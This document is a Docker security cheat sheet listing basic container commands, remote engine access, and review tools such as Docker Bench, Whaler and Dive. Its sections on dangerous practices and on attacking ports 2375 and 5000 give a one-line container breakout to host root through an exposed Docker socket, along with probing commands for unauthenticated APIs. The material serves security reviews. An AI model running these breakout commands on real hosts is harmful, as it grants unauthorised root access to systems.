# Docker Security Cheat Sheet

This is a list of commands that can be useful on Docker security reviews (and generally for using Docker).  

# Basic Docker run commands

## Run an interactive Docker container

This uses the Docker image `ubuntu:18.04` from Docker hub to create a bash shell running interactively in the container.
```
docker run -it ubuntu:18.04 /bin/bash
```

## Run a one command Docker container

This runs the command `ip addr` inside a container based on the `alpine:latest` image and then exits with the output from the command shown in the terminal.

```
docker run alpine:latest ip addr
```

## Run a container in the background

This runs an instance of the nginx web server image in the background

```
docker run -d nginx
```

# Working with Images and containers

## List running containers

```
docker ps
```

## List all containers including stopped ones

```
docker ps -a
```

## List images that are available on the Docker Engine instance

```
docker images
```

## Seach for images on Docker hub

This will search Docker hub for images that contain the string `nmap`

```
docker search nmap
```

# Getting data into and out of containers

## Host Volume Mount

This will map a directory called `/home/ubuntu/test` into a container running the `ubuntu:18.04` image, where it will appear as `/test` and run a bash shell interactively.

```
docker run -it -v /home/ubuntu/test:/test ubuntu:18.04 /bin/bash
```

## Copy data out of a container

This will copy a file called `/etc/passwd` from inside a container called `test` to the user's current working directory (N.B the container can be stopped and this still works)

```
docker cp test:/etc/passwd ./
```

# Docker Networking

## Making ports available to the outside world

This will run a container based on the `nginx` image and expose that container's port `80/TCP` to the host's network on port `8080/TCP` on all network interfaces.

```
docker run -d -p 8080:80 nginx
```

This will run an `nginx` container and use the host's network interface exposing it on port `80/TCP` directly without any iptables rules

```
docker run -d --net=host nginx
```

# Connecting to remote Docker Engine instances

## SSH

Set this environment variable.  This would point the docker client at a Docker engine instance running on `192.168.200.1`

```
export DOCKER_HOST=ssh://192.168.200.1
```

Alternatively specify the host in the docker command.  This would list containers on a Docker engine at `192.168.200.1` connecting over SSH.

```
docker -H ssh://192.168.200.1 ps
```

For best effect configure key based login to the remote host and add your key to an SSH agent.

## TCP

This would connect over an unencrypted connection to a remote Docker engine running on port `2375/TCP` on `192.168.200.1` and list containers

```
docker -H tcp://192.168.200.1:2375 ps
```

# Dangerous things to do with containers

## Running with --privileged

This will run a container in privileged mode, which disables all of the security features of Docker making it easy to break out to the underlying host.

```
docker run -it --privileged ubuntu:18.04 /bin/bash
```

## Mounting the Docker socket inside a container

This will make the docker socket available inside the container meaning docker commands can be run inside the container and affect the host.

```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock raesene/alpine-containertools /bin/ash
```

## Breakout out of a container which exposes the Docker Socket

You can use "The most useless Docker command ever" to break out to the underlying host from any container that provides docker socket access. This command is run from inside a container and assumes you've got access to the `docker` command inside the container.

Once you've run this command you'll be root on the underlying host.

```
docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
```

# Ports to look for

`2375/TCP` - Docker Engine unencrypted port
`2376/TCP` - Docker Enging - Encrypted port
`5000/TCP` - Docker Registry

# Attacking Port 2375/TCP

A standard test for this port would be to use standard docker commands, if this works it likely means the host can be compromised using the command above in "Breakout of a container which exposes the Docker Socket"

```
docker -H tcp://[IP]:2375 ps
```

# Attacking Port 5000/TCP

The registry present an HTTP API and can store Docker image which may contain useful information.  You can use curl to test this to see if it's available unauthenticated.

```
curl http://[IP]:5000/v2/_catalog
```


# Docker Security Tools

## Docker Bench - https://github.com/docker/docker-bench-security

Good for reviewing the configuration of a Docker engine install. (https://github.com/docker/docker-bench-security)

```
docker run -it --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /etc:/etc \
    -v /usr/bin/docker-containerd:/usr/bin/docker-containerd \
    -v /usr/bin/docker-runc:/usr/bin/docker-runc \
    -v /usr/lib/systemd:/usr/lib/systemd \
    -v /var/lib:/var/lib \
    -v /var/run/docker.sock:/var/run/docker.sock \
    --label docker_bench_security \
    docker/docker-bench-security
```

## Whaler - https://github.com/P3GLEG/Whaler

Good for analyzing docker Images.  this command would do an analysis of the wordpress image from Docker hub.

```
Whaler wordpress
```

## Dive - https://github.com/wagoodman/dive

Another tool for analyzing Docker images.  this command would do an analysis of the wordpress image from Docker hub.

```
dive wordpress
```